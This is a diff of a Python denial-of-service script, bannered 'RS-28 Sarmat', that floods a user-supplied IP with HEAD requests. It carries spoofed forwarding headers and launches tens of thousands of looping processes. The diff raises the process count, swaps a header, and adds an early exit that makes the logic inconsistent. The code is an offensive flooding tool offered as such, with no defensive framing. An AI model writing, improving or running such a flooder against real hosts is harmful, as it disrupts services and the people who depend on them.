@@ -54,7 +54,7 @@ def randomip():
 def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"	
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
+  forward = "X-Forwarded-Proto: " + randomip() + "\r\n"
   get_host = "HEAD "  + url + " HTTP/3.0\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
@@ -75,14 +75,14 @@ port = int(input("Port: "))
 url = f"http://{str(ip)}"
 print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
-
+exit("1")
 	
 def send3attack():
-  for i in range(50000): #Poder mágico
+  for i in range(60000): #Poder mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
 
     
 send3attack()
-exit("Enter")
+exit(0)
